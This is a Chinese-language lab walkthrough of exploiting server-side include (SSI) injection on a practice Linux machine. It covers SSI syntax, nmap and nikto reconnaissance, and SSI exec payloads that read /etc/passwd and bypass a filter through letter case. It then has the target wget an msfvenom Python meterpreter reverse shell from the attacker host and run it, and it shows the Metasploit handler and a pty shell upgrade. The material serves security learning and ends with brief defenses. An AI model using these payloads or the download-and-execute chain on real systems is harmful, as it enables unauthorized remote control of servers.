## 前言

如何从外部进入主机？

## SSI注入攻击介绍

SSI(server side inject)的出现是为了赋予HTML静态页面动态的效果，通过SSI来执行系统命令；并返回对应的结果。

如果再网站目录中发现了`.stm；.shtm；.shtml；`这样的文件后缀名，并且网站对于SSI的输入没有做到严格过滤或者过滤不充分；很有可能被SSI注入攻击。

### SSI语法

 **①** 显示服务器端环境变量 **< #**echo **>**

本文档名称：

> <!–#echo var="DOCUMENT_NAME"–>

现在时间：

> <!–#echo var="DATE_LOCAL"–>

显示IP地址：

> <! #echo var="REMOTE_ADDR"–>

 **②** 将文本内容直接插入到文档中 **< #include>**

> <! #include file="文件名称"–>
>
> <!--#include virtual="index.html" -->
>
> <! #include virtual="文件名称"–>
>
> <!--#include virtual="/www/footer.html" -->

注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径

 **③** 显示WEB文档相关信息 **< #flastmod><#fsize>(**如文件制作日期/大小等 **)**

文件最近更新日期：

> <! #flastmod file="文件名称"–>

文件的长度：

> <!–#fsize file="文件名称"–>

 **④** 直接执行服务器上的各种程序 **< #exec>(**如CGI或其他可执行程序 **)**

> <!–#exec cmd="文件名称"–>
>
> <!--#exec cmd="cat /etc/passwd"-->
>
> <!–#exec cgi="文件名称"–>
>
> <!--#exec cgi="/cgi-bin/access_log.cgi"–>
>
> ## 实验环境

攻击机：kali `10.0.2.4`

靶场机器：linux`10.0.2.15`

### 信息探测

扫描主机服务信息以及服务版本

    
    
    nmap -sV [ip]

![](https://image.3001.net/images/20200801/1596250524.jpg!small)  
可以看出靶场机器开放了80端口并且操作系统是ubuntu

快速扫描主机全部信息

    
    
    nmap -T4 -A -v [ip]

![](https://image.3001.net/images/20200801/1596251026.jpg!small)

既然是开启的http服务，那么就应该是可以访问的，思路就是可以在浏览器直接访问查看有没有可以利用的信息，并且扫描结果显示robots协议中发现一个信息。有时候还会在源代码中藏有信息。

![](https://image.3001.net/images/20200801/1596251555.jpg!small)这个在默认界面没有发现信息，但是robots中发现了目录
/spukcab

![](https://image.3001.net/images/20200801/1596251641.jpg!small)挨个查看，看看有无敏感信息。可以下载下来，more查看内容，发现一个可能有用的信息，根据前几次的经验，这里可能是个用户名`webmaster`；只是可能。还有就是站点根目录的位置已经得到了。

![](https://image.3001.net/images/20200801/1596261910.jpg!small)其他的暂时没有，继续探测，因为是http服务，所以可以使用nikto或者dirb进行敏感目录扫描

![](https://image.3001.net/images/20200801/1596264095.jpg!small)

### 深入挖掘

分析nmap、nikto扫描结果，并对结果进行分析，挖掘可利用的信息；

都进行浏览查看敏感信息，寻找可利用的位置；

挨个访问查看信息，`http://10.0.2.15/index`

![](https://image.3001.net/images/20200801/1596265589.jpg!small)

上面扫描中有个SSI

![](https://image.3001.net/images/20200801/1596264723.jpg!small)

还有这里，发现`.shtml`文件

![](https://image.3001.net/images/20200801/1596264847.jpg!small)猜想可能存在SSI注入，其实找了很多信息，就是为了找到这个能证明有SSI存在的标志。

继续找可以利用的信息，发现`http://10.0.2.15/index.php`

![](https://image.3001.net/images/20200801/1596265384.jpg!small)

可以在这个表单提交处，这里执行SSI的命令

### 漏洞利用

根据提示来利用对应的SSI注入

将上面index页面中的payload复制一下，粘贴到表单中进行提交

像这样

![](https://image.3001.net/images/20200801/1596265740.jpg!small)提交后发现第一行过滤了尖括号，第二行的exec被过滤了。而且payload也不是完整的。

![](https://image.3001.net/images/20200801/1596265771.jpg!small)绕过这个exec的过滤条件，因为是linux系统，所以首先想到的应该是大小写。而且完整的payload应当在前面有`!`

像这样

    
    
    <!--#exec cmd="cat /etc/passwd" --> 

![](https://image.3001.net/images/20200801/1596267956.jpg!small)

比如：

列举当前目录中的文件和目录

    
    
    <!--#exec cmd="ls"-->

就是可以执行一些终端命令

进一步利用，下载一个shell脚本并重命名为shell.php

    
    
    <!--#exec cmd="wget http://ip/shell.txt | rename shell.txt shell.php"-->

### 制作webshell

之前使用的php制作的webshell，这次使用python

    
    
    msfvenom -p python/meterpreter/reverse_tcp lhost=10.0.2.4 lport=4444 -f raw > /root/Desktop/shell.py

![](https://image.3001.net/images/20200801/1596271739.jpg!small)

启动监听，使用metasploit对4444端口进行监听

    
    
    msf5 > use exploit/multi/handler 
    [*] Using configured payload generic/shell_reverse_tcp  
    msf5 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp  
    payload => python/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > set lhost 10.0.2.4  
lhost => 10.0.2.4  
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.0.2.4:4444

设置好后开始侦听4444端口

![](https://image.3001.net/images/20200801/1596271716.jpg!small)

将shell.py移动到apache目录下，才可以使用IP地址的链接下载

![](https://image.3001.net/images/20200801/1596271804.jpg!small)然后需要开启apache服务`service
apache2 start`

![](https://image.3001.net/images/20200801/1596272119.jpg!small)

然后执行下载命令将shell下载到靶机的站点目录当中，

    
    
    <!--#exec cmd="wget http://10.0.2.4/shell.py"-->

![](https://image.3001.net/images/20200801/1596272226.jpg!small)

然后执行语句赋予shell执行权限再进行执行

    
    
    #加权限  
    <!--#exec cmd="chmod 777 shell.py"-->  
    #执行  
    <!--#exec cmd="python shell.py"-->

然后看到浏览器在不断发送请求，到终端查看监听状况，发现返回了meterpreter

![](https://image.3001.net/images/20200801/1596272530.jpg!small)输入`?`可以查看当前可执行的命令

    
    
      
    

Core Commands  
=============

Command Description  
\------- -----------  
? Help menu  
background Backgrounds the current session  
bg Alias for background  
bgkill Kills a background meterpreter script  
bglist Lists running background scripts  
bgrun Executes a meterpreter script as a background thread  
channel Displays information or control active channels  
close Closes a channel  
disable_unicode_encoding Disables encoding of unicode strings  
enable_unicode_encoding Enables encoding of unicode strings  
exit Terminate the meterpreter session  
get_timeouts Get the current session timeout values  
guid Get the session GUID  
help Help menu  
info Displays information about a Post module  
irb Open an interactive Ruby shell on the current session  
load Load one or more meterpreter extensions  
machine_id Get the MSF ID of the machine attached to the session  
migrate Migrate the server to another process  
pry Open the Pry debugger on the current session  
quit Terminate the meterpreter session  
read Reads data from a channel  
resource Run the commands stored in a file  
run Executes a meterpreter script or Post module  
secure (Re)Negotiate TLV packet encryption on the session  
sessions Quickly switch to another session  
set_timeouts Set the current session timeout values  
sleep Force Meterpreter to go quiet, then re-establish session.  
transport Change the current transport mechanism  
use Deprecated alias for "load"  
uuid Get the UUID for the current session  
write Writes data to a channel

  
Stdapi: File system Commands  
============================

Command Description  
\------- -----------  
cat Read the contents of a file to the screen  
cd Change directory  
checksum Retrieve the checksum of a file  
chmod Change the permissions of a file  
cp Copy source to destination  
dir List files (alias for ls)  
download Download a file or directory  
edit Edit a file  
getlwd Print local working directory  
getwd Print working directory  
lcd Change local working directory  
lls List local files  
lpwd Print local working directory  
ls List files  
mkdir Make directory  
mv Move source to destination  
pwd Print working directory  
rm Delete the specified file  
rmdir Remove directory  
search Search for files  
upload Upload a file or directory

  
Stdapi: Networking Commands  
===========================

Command Description  
\------- -----------  
ifconfig Display interfaces  
ipconfig Display interfaces  
portfwd Forward a local port to a remote service  
resolve Resolve a set of host names on the target

  
Stdapi: System Commands  
=======================

Command Description  
\------- -----------  
execute Execute a command  
getenv Get one or more environment variable values  
getpid Get the current process identifier  
getuid Get the user that the server is running as  
kill Terminate a process  
localtime Displays the target system's local date and time  
pgrep Filter processes by name  
pkill Terminate processes by name  
ps List running processes  
shell Drop into a system command shell  
sysinfo Gets information about the remote system, such as OS

  
Stdapi: Audio Output Commands  
=============================

Command Description  
\------- -----------  
play play a waveform audio file (.wav) on the target system

  

输入shell进行利用，再查看id，发现当前登录的只是一个普通用户，而不是root用户

![](https://image.3001.net/images/20200801/1596272796.jpg!small)终端可以选择进行优化一下，就是让其显示用户名和主机名，和kali的终端形式那样。

    
    
    python -c 'import pty;pty.spawn("/bin/bash")'

然后就是提权，靶场没有设置flag值，目的是为了学习SSI注入，所以就不再继续进行下去了。

## 总结

对于SSI漏洞服务器有很多过滤机制，需要进行绕过，比如大小写。

防御措施：

一、进行过滤，过滤这些语法中的特殊字符

二、关闭服务器SSI相关功能

